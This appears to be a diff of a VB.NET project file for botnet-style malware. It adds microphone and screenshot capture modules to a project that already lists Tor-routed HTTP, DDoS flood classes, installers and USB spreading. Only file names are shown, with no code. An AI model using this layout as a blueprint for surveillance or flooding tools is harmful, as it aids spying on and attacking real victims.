@@ -66,6 +66,9 @@
     <ApplicationManifest>My Project\app.manifest</ApplicationManifest>
   </PropertyGroup>
   <ItemGroup>
+    <Reference Include="NAudio">
+      <HintPath>D:\Downloads\Audio_Live_Streaming_DLL\NAudio.dll</HintPath>
+    </Reference>
     <Reference Include="Newtonsoft.Json, Version=12.0.0.0, Culture=neutral, PublicKeyToken=30ad4fe6b2a6aeed, processorArchitecture=MSIL">
       <HintPath>..\packages\Newtonsoft.Json.12.0.3\lib\net45\Newtonsoft.Json.dll</HintPath>
     </Reference>
@@ -81,12 +84,14 @@
     <Reference Include="System" />
     <Reference Include="System.Data" />
     <Reference Include="System.Deployment" />
+    <Reference Include="System.Drawing" />
     <Reference Include="System.IO.Compression.FileSystem" />
     <Reference Include="System.IO.Compression.ZipFile, Version=4.0.2.0, Culture=neutral, PublicKeyToken=b77a5c561934e089, processorArchitecture=MSIL">
       <HintPath>..\packages\System.IO.Compression.ZipFile.4.3.0\lib\net46\System.IO.Compression.ZipFile.dll</HintPath>
       <Private>True</Private>
       <Private>True</Private>
     </Reference>
+    <Reference Include="System.Windows.Forms" />
     <Reference Include="System.Xml" />
     <Reference Include="System.Core" />
     <Reference Include="System.Xml.Linq" />
@@ -115,7 +120,7 @@
     <Compile Include="Class\Network\SendHTTPonTor.vb" />
     <Compile Include="Class\Network\TcpListen.vb" />
     <Compile Include="CloseDetect.vb" />
-    <Compile Include="Models\BaseCommandHandlerModel.vb" />
+    <Compile Include="Models\BaseModel.vb" />
     <Compile Include="Models\BotDeatilsModel.vb" />
     <Compile Include="Models\FloodModel\ArmeModel.vb" />
     <Compile Include="Models\FloodModel\BaseFloodModel.vb" />
@@ -129,6 +134,7 @@
     <Compile Include="Models\FloodModel\TcpModel.vb" />
     <Compile Include="Models\Json\ConfigBotModel.vb" />
     <Compile Include="Models\LogModel.vb" />
+    <Compile Include="Models\Json\MicroPhoneDevicesListModel.vb" />
     <Compile Include="Models\WebsiteModel.vb" />
     <Compile Include="Class\Floods\Floods\3. Layer\ICMP.vb" />
     <Compile Include="Class\Floods\Floods\4. Layer\TCP.vb" />
@@ -144,10 +150,12 @@
     <Compile Include="Moduls\Converter\TimeConverter.vb" />
     <Compile Include="Moduls\Details\Details.vb" />
     <Compile Include="Moduls\Grabs\ImageGrab.vb" />
+    <Compile Include="Moduls\Grabs\MicroPhoneGrab.vb" />
+    <Compile Include="Moduls\Grabs\TakeScreenShot.vb" />
     <Compile Include="Moduls\Installers\CopyModule.vb" />
     <Compile Include="Moduls\Installers\Installing.vb" />
     <Compile Include="Moduls\IO\UnZIPModule.vb" />
-    <Compile Include="Moduls\Network\DownloadFileModule.vb" />
+    <Compile Include="Moduls\Network\ResponseHTTP.vb" />
     <Compile Include="Moduls\Network\StreamWrite.vb" />
     <Compile Include="Moduls\Search\ImageSearch.vb" />
     <Compile Include="Moduls\Spreads\USBSpread.vb" />
